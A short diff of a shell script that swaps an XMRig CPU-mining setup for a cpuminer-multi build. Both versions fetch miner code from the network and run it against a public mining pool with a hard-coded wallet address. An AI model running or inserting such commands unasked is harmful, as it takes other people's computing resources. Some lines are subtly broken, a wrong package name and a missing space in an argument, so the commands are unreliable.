@@ -1,5 +1,5 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz
-tar -zxvf xmrig-6.14.1-linux-x64.tar.gz
-cd xmrig-6.14.1
-clear
-./xmrig -o rx.unmineable.com:3333 -a rx -k -u DOGE:DECFSSqi5UfXNTTTEuQiHVRNHguxJmm2Ah.WORKER -p x
+apt-get install automake autoconf pkg-config libcurl14-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
+git clone https://github.com/litecoincash-project/cpuminer-multi
+cd cpuminer-multi
+./build.sh
+./cpuminer -a yescrypt-o stratum+tcp://yescrypt.sea.mine.zpool.ca:6233 -u RLuhwTLYN8Jo77QADBqU4b69tRLcPjEvFv -p c=RVN
